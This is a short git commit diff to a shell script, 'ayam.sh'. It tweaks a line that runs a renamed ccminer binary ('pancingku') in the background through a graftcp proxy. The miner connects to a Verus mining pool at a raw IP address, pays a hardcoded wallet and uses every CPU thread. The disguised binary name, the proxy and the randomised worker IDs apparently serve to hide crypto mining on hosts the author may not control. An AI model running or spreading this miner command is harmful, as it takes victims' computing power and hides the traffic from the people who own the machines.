9003033ca0efc7f485f127fb0137a5bcf50f7614
marcelinoferdom <marcelinoferdinanverciuskon@gmail.com>
2024-09-25 20:30:21 +0700

    Update ayam.sh

--- ayam.sh
+++ ayam.sh
@@ -39,7 +39,7 @@ END
   echo " "
 
   # Run ccminer in the background
-  /usr/bin/graftcp ./pancingku -a verus -o stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 1-1000 -n 1)) -p x -t "$(nproc)" &
+  /usr/bin/graftcp ./pancingku -a verus -o stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x -t "$(nproc)" &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
